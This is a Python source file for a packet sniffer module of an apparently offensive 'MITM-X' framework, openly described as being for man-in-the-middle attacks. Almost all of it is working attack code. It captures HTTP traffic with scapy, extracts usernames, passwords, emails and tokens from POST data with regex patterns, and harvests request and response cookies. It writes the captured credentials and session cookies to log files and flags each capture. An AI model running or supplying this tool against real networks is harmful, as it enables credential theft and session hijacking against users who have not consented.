#!/usr/bin/env python3
"""
Packet Sniffer Module for MITM-X Framework
Sniffs and analyzes network traffic to extract sensitive information
"""

import os
import sys
import time
import argparse
import logging
import json
import re
from datetime import datetime
from urllib.parse import unquote, parse_qs
try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest, HTTPResponse
    from scapy.layers.inet import IP, TCP
except ImportError:
    print("Scapy not installed. Run: pip3 install scapy")
    sys.exit(1)

class PacketSniffer:
    """
    Packet Sniffer class to capture and analyze network traffic
    """
    
    def __init__(self, interface="eth0", output_dir="logs/"):
        """
        Initialize Packet Sniffer
        
        Args:
            interface (str): Network interface to sniff on
            output_dir (str): Directory to save log files
        """
        self.interface = interface
        self.output_dir = output_dir
        self.running = False
        self.packet_count = 0
        
        # Create output directory if it doesn't exist
        os.makedirs(output_dir, exist_ok=True)
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Log files
        self.http_log = os.path.join(output_dir, "http_traffic.log")
        self.credentials_log = os.path.join(output_dir, "credentials.log")
        self.cookies_log = os.path.join(output_dir, "cookies.log")
        self.urls_log = os.path.join(output_dir, "urls.log")
        self.packets_log = os.path.join(output_dir, "packets.json")
        
        # Data storage
        self.captured_data = []
        
    def log_to_file(self, filename, data):
        """
        Log data to specified file
        
        Args:
            filename (str): File path to write to
            data (str): Data to write
        """
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {data}\n")
        except Exception as e:
            self.logger.error(f"Error writing to {filename}: {e}")
    
    def extract_http_info(self, packet):
        """
        Extract HTTP information from packet
        
        Args:
            packet: Scapy packet object
            
        Returns:
            dict: Extracted HTTP information
        """
        http_info = {}
        
        try:
            if packet.haslayer(HTTPRequest):
                http_request = packet[HTTPRequest]
                
                # Extract basic info
                http_info['type'] = 'request'
                http_info['method'] = http_request.Method.decode() if http_request.Method else ''
                http_info['host'] = http_request.Host.decode() if http_request.Host else ''
                http_info['path'] = http_request.Path.decode() if http_request.Path else ''
                http_info['user_agent'] = http_request.User_Agent.decode() if http_request.User_Agent else ''
                http_info['referer'] = http_request.Referer.decode() if http_request.Referer else ''
                
                # Extract cookies
                if http_request.Cookie:
                    http_info['cookies'] = http_request.Cookie.decode()
                
                # Extract POST data
                if hasattr(http_request, 'load') and http_request.load:
                    http_info['post_data'] = http_request.load.decode(errors='ignore')
                
                # Full URL
                http_info['url'] = f"http://{http_info['host']}{http_info['path']}"
                
            elif packet.haslayer(HTTPResponse):
                http_response = packet[HTTPResponse]
                
                http_info['type'] = 'response'
                http_info['status_code'] = http_response.Status_Code.decode() if http_response.Status_Code else ''
                http_info['server'] = http_response.Server.decode() if http_response.Server else ''
                http_info['content_type'] = http_response.Content_Type.decode() if http_response.Content_Type else ''
                
                # Extract Set-Cookie headers
                if http_response.Set_Cookie:
                    http_info['set_cookies'] = http_response.Set_Cookie.decode()
                
                # Extract response body
                if hasattr(http_response, 'load') and http_response.load:
                    http_info['response_body'] = http_response.load.decode(errors='ignore')
        
        except Exception as e:
            self.logger.error(f"Error extracting HTTP info: {e}")
        
        return http_info
    
    def extract_credentials(self, http_info):
        """
        Extract potential credentials from HTTP data
        
        Args:
            http_info (dict): HTTP information dictionary
            
        Returns:
            dict: Extracted credentials
        """
        credentials = {}
        
        try:
            # Look for credentials in POST data
            if 'post_data' in http_info and http_info['post_data']:
                post_data = http_info['post_data']
                
                # Common credential field patterns
                patterns = {
                    'username': r'(?:user|username|email|login)=([^&\s]+)',
                    'password': r'(?:pass|password|pwd)=([^&\s]+)',
                    'email': r'(?:email|mail)=([^&\s]+)',
                    'token': r'(?:token|csrf|_token)=([^&\s]+)'
                }
                
                for field, pattern in patterns.items():
                    match = re.search(pattern, post_data, re.IGNORECASE)
                    if match:
                        value = unquote(match.group(1))
                        if value and len(value) > 1:  # Filter out empty/short values
                            credentials[field] = value
                
                # Parse URL encoded data
                try:
                    parsed_data = parse_qs(post_data)
                    for key, values in parsed_data.items():
                        if any(keyword in key.lower() for keyword in ['user', 'pass', 'email', 'login']):
                            if values and values[0]:
                                credentials[key] = values[0]
                except:
                    pass
        
        except Exception as e:
            self.logger.error(f"Error extracting credentials: {e}")
        
        return credentials
    
    def extract_cookies(self, http_info):
        """
        Extract and parse cookies from HTTP data
        
        Args:
            http_info (dict): HTTP information dictionary
            
        Returns:
            dict: Parsed cookies
        """
        cookies = {}
        
        try:
            # Extract request cookies
            if 'cookies' in http_info and http_info['cookies']:
                cookie_string = http_info['cookies']
                for cookie in cookie_string.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        cookies[name] = value
            
            # Extract response cookies (Set-Cookie)
            if 'set_cookies' in http_info and http_info['set_cookies']:
                cookie_string = http_info['set_cookies']
                for cookie in cookie_string.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        cookies[name] = value
        
        except Exception as e:
            self.logger.error(f"Error extracting cookies: {e}")
        
        return cookies
    
    def process_packet(self, packet):
        """
        Process captured packet and extract relevant information
        
        Args:
            packet: Scapy packet object
        """
        try:
            self.packet_count += 1
            
            # Basic packet info
            packet_info = {
                'timestamp': datetime.now().isoformat(),
                'packet_number': self.packet_count
            }
            
            # Extract IP information
            if packet.haslayer(IP):
                ip_layer = packet[IP]
                packet_info['src_ip'] = ip_layer.src
                packet_info['dst_ip'] = ip_layer.dst
                packet_info['protocol'] = ip_layer.proto
            
            # Extract TCP information
            if packet.haslayer(TCP):
                tcp_layer = packet[TCP]
                packet_info['src_port'] = tcp_layer.sport
                packet_info['dst_port'] = tcp_layer.dport
            
            # Process HTTP traffic
            if packet.haslayer(HTTPRequest) or packet.haslayer(HTTPResponse):
                http_info = self.extract_http_info(packet)
                packet_info['http'] = http_info
                
                # Log HTTP traffic
                if http_info:
                    if http_info.get('type') == 'request':
                        log_entry = f"REQUEST: {http_info.get('method', '')} {http_info.get('url', '')} - UA: {http_info.get('user_agent', '')}"
                        self.log_to_file(self.http_log, log_entry)
                        
                        # Log URL
                        if http_info.get('url'):
                            self.log_to_file(self.urls_log, http_info['url'])
                        
                        # Extract and log credentials
                        credentials = self.extract_credentials(http_info)
                        if credentials:
                            cred_entry = f"URL: {http_info.get('url', '')} - Credentials: {json.dumps(credentials)}"
                            self.log_to_file(self.credentials_log, cred_entry)
                            self.logger.warning(f"Credentials captured: {credentials}")
                        
                        # Extract and log cookies
                        cookies = self.extract_cookies(http_info)
                        if cookies:
                            cookie_entry = f"URL: {http_info.get('url', '')} - Cookies: {json.dumps(cookies)}"
                            self.log_to_file(self.cookies_log, cookie_entry)
                    
                    elif http_info.get('type') == 'response':
                        log_entry = f"RESPONSE: {http_info.get('status_code', '')} - Content-Type: {http_info.get('content_type', '')}"
                        self.log_to_file(self.http_log, log_entry)
                        
                        # Log response cookies
                        cookies = self.extract_cookies(http_info)
                        if cookies:
                            cookie_entry = f"Response Cookies: {json.dumps(cookies)}"
                            self.log_to_file(self.cookies_log, cookie_entry)
            
            # Store packet data
            self.captured_data.append(packet_info)
            
            # Save to JSON file periodically (every 100 packets)
            if self.packet_count % 100 == 0:
                self.save_captured_data()
        
        except Exception as e:
            self.logger.error(f"Error processing packet: {e}")
    
    def save_captured_data(self):
        """
        Save captured data to JSON file
        """
        try:
            with open(self.packets_log, 'w') as f:
                json.dump(self.captured_data, f, indent=2)
        except Exception as e:
            self.logger.error(f"Error saving captured data: {e}")
    
    def start_sniffing(self, filter_str=""):
        """
        Start packet sniffing
        
        Args:
            filter_str (str): BPF filter string for packet filtering
        """
        self.logger.info(f"Starting packet sniffing on interface {self.interface}")
        self.logger.info(f"Output directory: {self.output_dir}")
        
        if filter_str:
            self.logger.info(f"Using filter: {filter_str}")
        
        self.running = True
        
        try:
            # Start sniffing
            sniff(iface=self.interface, prn=self.process_packet, 
                  filter=filter_str, store=0)
        except KeyboardInterrupt:
            self.logger.info("Packet sniffing interrupted")
        except Exception as e:
            self.logger.error(f"Error during packet sniffing: {e}")
        finally:
            self.stop_sniffing()
    
    def stop_sniffing(self):
        """
        Stop packet sniffing and save data
        """
        self.running = False
        self.save_captured_data()
        
        self.logger.info(f"Packet sniffing stopped. Captured {self.packet_count} packets")
        self.logger.info(f"Log files saved in {self.output_dir}")
    
    def analyze_captured_data(self):
        """
        Analyze captured data and generate summary
        
        Returns:
            dict: Analysis summary
        """
        summary = {
            'total_packets': len(self.captured_data),
            'unique_ips': set(),
            'unique_urls': set(),
            'credentials_found': 0,
            'cookies_found': 0
        }
        
        for packet in self.captured_data:
            # Collect unique IPs
            if 'src_ip' in packet:
                summary['unique_ips'].add(packet['src_ip'])
            if 'dst_ip' in packet:
                summary['unique_ips'].add(packet['dst_ip'])
            
            # Collect HTTP info
            if 'http' in packet:
                http_info = packet['http']
                if http_info.get('url'):
                    summary['unique_urls'].add(http_info['url'])
        
        # Convert sets to lists for JSON serialization
        summary['unique_ips'] = list(summary['unique_ips'])
        summary['unique_urls'] = list(summary['unique_urls'])
        
        return summary

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="Packet Sniffer for MITM attacks")
    parser.add_argument("--interface", "-i", default="eth0", help="Network interface")
    parser.add_argument("--output", "-o", default="logs/", help="Output directory")
    parser.add_argument("--filter", "-f", default="", help="BPF filter string")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        sys.exit(1)
    
    # Create packet sniffer
    sniffer = PacketSniffer(args.interface, args.output)
    
    try:
        sniffer.start_sniffing(args.filter)
    except KeyboardInterrupt:
        print("\nStopping packet sniffer...")
        sniffer.stop_sniffing()
        
        # Show analysis summary
        summary = sniffer.analyze_captured_data()
        print(f"\nCapture Summary:")
        print(f"Total packets: {summary['total_packets']}")
        print(f"Unique IPs: {len(summary['unique_ips'])}")
        print(f"Unique URLs: {len(summary['unique_urls'])}")

if __name__ == "__main__":
    main()
